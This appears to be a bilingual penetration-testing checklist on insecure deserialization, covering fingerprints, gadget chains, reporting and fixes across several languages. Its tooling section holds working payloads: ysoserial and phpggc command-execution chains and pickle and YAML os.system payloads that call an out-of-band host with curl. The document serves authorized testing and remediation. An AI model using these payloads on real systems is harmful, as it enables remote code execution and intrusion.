---
id: clk-deserialization
title: Insecure Deserialization
owasp_anchor: [A08:2021, WSTG-INPV]
cwe: [CWE-502]
severity_typical: P1
playbook: playbooks/deserialization.yaml
last_updated: 2026-05-14
sources:
  - docs/intelligence_kb/cases/researcher_writeups/14-prototype-pollution-to-xss-via-lodash-merge-gadget-on-shopify-updated-2024-chain.md
  - docs/intelligence_kb/cases/researcher_writeups/16-gala-dynamic-analysis-finds-133-zero-day-pp-gadgets-incl-vue-cve-2024-6783.md
  - docs/intelligence_kb/cases/researcher_writeups/8-prototype-pollution-gadget-in-meta-fbevents-js-to-cookie-manipulation-gala-research.md
  - docs/intelligence_kb/review_queue/16-hugging-face-hub-llm-bug-bounty-unsafe-pickle-loads-in-model-demos-supply-chain.md
  - docs/intelligence_kb/review_queue/resource-16-hugging-face-hub-llm-bug-bounty-unsafe-pickle-loads-in-model-demos-supply-ch.md
  - docs/intelligence_kb/techniques/new_2024_2026/15-h2-cl-desync-via-early-response-gadgets-for-response-queue-poisoning.md
  - docs/intelligence_kb/techniques/new_2024_2026/19-prototype-pollution-via-deepmerge-in-antfu-utils-huntr-bb.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-14-prototype-pollution-to-xss-via-lodash-merge-gadget-on-shopify-updated-20.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-16-gala-dynamic-analysis-finds-133-zero-day-pp-gadgets-incl-vue-cve-2024-67.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-8-prototype-pollution-gadget-in-meta-fbevents-js-to-cookie-manipulation-gal.md
  - docs/intelligence_kb/techniques/niche_tricks/19-prototype-pollution-via-deepmerge-in-antfu-utils-huntr-bb.md
maturity: stable
---

# Insecure Deserialization Checklist

> 双语 / Bilingual: 跨语言反序列化攻击面合一（Java / .NET / PHP / Python / Ruby / Node / YAML / JSON）。
> 用法：先做"Recon & 序列化指纹"判断协议，再按目标语言分支挑 gadget。
> Authorization-only：gadget chain 一律先在自托管 OOB 通道（DNS / HTTP）验证，再考虑命令执行；未授权环境严禁 RCE PoC。

---

## 1. Recon & 序列化指纹

- [ ] 抓所有 cookie / hidden field / Authorization / postMessage / queue body
- [ ] 识别 magic header
  - Java：`rO0AB`（base64）/ `\xac\xed\x00\x05`
  - .NET：`AAEAAAD`（BinaryFormatter）/ `<SOAP-ENV` / `xml.NetDataContract`
  - PHP：`O:N:"ClassName":` / `a:N:{` / `s:N:"`
  - Python pickle：`\x80\x04` / `\x80\x05`、`__reduce__` 痕迹
  - Ruby Marshal：`\x04\x08`；Node node-serialize：`_$$ND_FUNC$$_`
  - YAML：`!!python/object` / `!!java` / `!ruby/object`
- [ ] RPC / queue：RMI(JRMP) / T3(WebLogic) / IIOP / Kryo / Hessian / Jackson poly / Fastjson / RabbitMQ / Redis pub/sub
- [ ] 解码端点：缓存 / session / OAuth state / SSO RelayState / SAML AttributeValue

## 2. Java 反序列化

- [ ] ObjectInputStream.readObject 是否暴露在 HTTP body / cookie / RMI / JMX
- [ ] 经典 sink：`Apache Commons-Collections` 3.x / 4.x / `BeanUtils` / `Spring` / `ROME` / `JBoss MarshalledValue`
- [ ] ysoserial gadget 选型：CC1 / CC3 / CC6 / CC9 / Hibernate1 / JRMPClient / URLDNS（先用 URLDNS 探活）
- [ ] Java RMI：1099 / 1199 端口，CVE-2017-3241 类 JRMPClient bind
- [ ] WebLogic T3 / IIOP（[example: CVE-2020-2555 / CVE-2020-14882 类]），关注 `weblogic.rjvm.ClassTableEntry`
- [ ] JBoss / Jenkins / WebSphere 老 endpoint：`/invoker/JMXInvokerServlet`、`/jenkins/cli`、`/wsrr/`
- [ ] Jackson polymorphic：`@JsonTypeInfo` 启用 + `enableDefaultTyping()` → poly gadget（Hibernate / c3p0 / spring）
- [ ] Fastjson：`@type` 触发 JdbcRowSetImpl / TemplatesImpl / Mvel
- [ ] XStream：`<dynamic-proxy>` / `EventHandler` 链
- [ ] Spring `RemoteInvocation` / `HttpInvoker`：仍存活的内部服务
- [ ] SnakeYAML：`!!javax.script.ScriptEngineManager`
- [ ] Class allowlist：`ObjectInputFilter` / `JEP 290` 是否启用，能否绕过

## 3. .NET 反序列化

- [ ] BinaryFormatter / SoapFormatter / NetDataContractSerializer / LosFormatter / ObjectStateFormatter（ViewState）
- [ ] ViewState：`__VIEWSTATE` 解码，验证 MAC（`viewStateUserKey`、`enableViewStateMac`）
- [ ] machineKey 泄露 / 默认值 / 静态 key（`web.config` 中 `validationKey`、`decryptionKey`）→ ysoserial.net `TypeConfuseDelegate`
- [ ] JSON.NET `TypeNameHandling=All / Auto / Objects` → 多态注入 `System.Windows.Data.ObjectDataProvider`
- [ ] `DataContractSerializer` + 知名类型 + 扩展（`KnownTypes` 注入）
- [ ] WCF NetTcp / WSHttp 端点：[example: BinaryFormatter via NetTcp 类]
- [ ] Remoting (.NET Framework) 端口 9090 / 9091
- [ ] PowerShell Remoting / WSMan 序列化（CLIXML）

## 4. PHP 反序列化

- [ ] `unserialize($_GET[...])` / cookie / session（PHP_SESSION_UPLOAD_PROGRESS）
- [ ] PHAR：`phar://` 在文件系统函数（file_exists / fopen / md5_file / getimagesize / xml_load）触发反序列化
- [ ] CMS 链：[example: WordPress / Joomla / Magento / Drupal POP chain 类]
- [ ] PHPGGC：自动生成 Laravel / Symfony / CodeIgniter / Yii / Doctrine / Guzzle / Monolog 链
- [ ] `__wakeup` / `__destruct` / `__toString` / `__call` magic 方法链
- [ ] Session storage（files / redis / memcached），同站多 app 共用 session 时的 cross-app 链
- [ ] 反序列化触发后是否落到 `assert()` / `eval()` / `create_function()` / `preg_replace /e`

## 5. Python 反序列化

- [ ] `pickle.loads` 暴露在 HTTP / queue / cache / model serialization
- [ ] 经典 payload：`__reduce__` 返回 `(os.system, ('id',))`
- [ ] `joblib.load` / `numpy.load(allow_pickle=True)` / `torch.load` / `tensorflow.keras.models.load_model` 加载远程模型 → RCE
- [ ] `dill` / `cloudpickle` 同样不安全
- [ ] PyYAML：`yaml.load` 默认 unsafe（`!!python/object/apply:os.system ['id']`），`yaml.safe_load` 才安全
- [ ] `marshal.loads` / `shelve` / `code object` 注入
- [ ] `flask session`（itsdangerous）：SECRET_KEY 泄露 / 弱 → 篡改 session

## 6. Ruby / Rails 反序列化

- [ ] `Marshal.load` 在 cookie / cache / Sidekiq job
- [ ] Rails `secret_key_base` 泄露 → 伪造 signed cookie / Marshal payload（[example: ActionPack CVE-2019-5420 类]）
- [ ] `YAML.load` 默认 unsafe（`!ruby/object`），ERB template gadget；OJ / Psych 选择性 tag

## 7. Node.js / JS 反序列化

- [ ] `node-serialize` `unserialize`：`_$$ND_FUNC$$_function(){...}()` 立即执行
- [ ] `serialize-javascript`：`{"fn": "_$$ND_FUNC$$_..."}` 注入
- [ ] `JSON.parse(input, reviver)` 恶意 reviver；`lodash.merge` / `_.set` 原型污染 → 链 RCE
- [ ] `vm` / `vm2` sandbox 逃逸（[example: vm2 sandbox escape 类]）；`safe-eval` / `funcster` 历史漏洞
- [ ] postMessage 自定义 wire format

## 8. JSON / YAML / 其他通用层

- [ ] JSON polymorphic：Jackson default typing / Fastjson autotype / Json.NET TypeNameHandling
- [ ] YAML 自定义 tag：`!!python/object`、`!ruby/object`、`!!java`、`!ruby/hash:HashWithIndifferentAccess`
- [ ] CBOR / MsgPack / BSON / Avro 自定义类型注解
- [ ] Protobuf `Any` 携带 type URL → 触发动态解析

## 9. 自动化辅助

```bash
# 序列化指纹 grep（rO0 / AAEAAAD / O: / \x80\x04）
grep -rE "rO0AB|AAEAAAD" ./*.har

# Java 探活（URLDNS 不需 RCE）
java -jar ysoserial.jar URLDNS http://oast.live/$(uuidgen) | base64

# .NET
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e <b64>"

# PHP
./phpggc Laravel/RCE9 system id -b

# Pickle PoC（仅自有靶机）
python3 -c "
import pickle, os, base64
class P:
    def __reduce__(self): return (os.system, ('curl https://oast.live/pickle',))
print(base64.b64encode(pickle.dumps(P())).decode())"

# YAML PoC
echo "!!python/object/apply:os.system ['curl https://oast.live/yaml']" > evil.yml

# Nuclei
nuclei -tags deserialization,rce,fastjson,jackson,viewstate -u https://target

# .NET ViewState 探测（machineKey 已知）
python3 -m viewstate <__VIEWSTATE>

# Burp ext: Java Deserialization Scanner (PortSwigger)
# Caido workflow: deser-fingerprint.yml — rO0 / AAEAAAD / O: 标记
```

## 10. Reporting Angle

* **Title 模板**：`<语言/库> insecure deserialization in <endpoint> allows <impact> via <gadget>`
  例：`Java ObjectInputStream on /api/import enables RCE via Commons-Collections5 chain`
* **Severity 自评**：
  * 未授权 RCE → CVSS 3.1 9.0-9.8 / VRT P1
  * 认证后 RCE / lateral move → CVSS 7.5-8.5 / VRT P1-P2
  * 反序列化导致 SSRF / 读文件（无 RCE）→ CVSS 6.0-7.5 / VRT P2
  * 仅 DoS（gadget 触发死循环 / OOM）→ CVSS 4.0-5.5 / VRT P3
* **CWE 推荐**：CWE-502（核心）；若链到命令执行追加 CWE-78；原型污染 CWE-1321
* **PoC 必须**：使用 OOB 通道（自托管 oast.live / interactsh）证明 gadget 触达，截 DNS/HTTP log；不投放破坏性命令
* **Suggested Fix**（至少 2 条）：
  * 替换为安全格式（JSON without polymorphism、Protobuf 显式 schema）；启用 `ObjectInputFilter` / `SerializationBinder` 白名单
  * 库升级（Jackson 关闭 default typing；Fastjson autotype 关闭并启用 `safeMode`；PyYAML 改 `safe_load`；Node 弃用 `node-serialize`）
  * 端到端签名（HMAC + 旋转密钥），不可信源不解码

## 11. 已迁移技法（来自 KB）

- [[techniques/ysoserial_cc_chain|Apache Commons-Collections gadget 选型]]
- [[techniques/phar_polyglot|PHAR polyglot 触发 unserialize]]
- [[techniques/fastjson_autotype|Fastjson autoType 绕过历代版本]]
- [[techniques/dotnet_viewstate|.NET ViewState machineKey 利用]]
- [[techniques/python_pickle_model|Python pickle / 模型文件 RCE]]
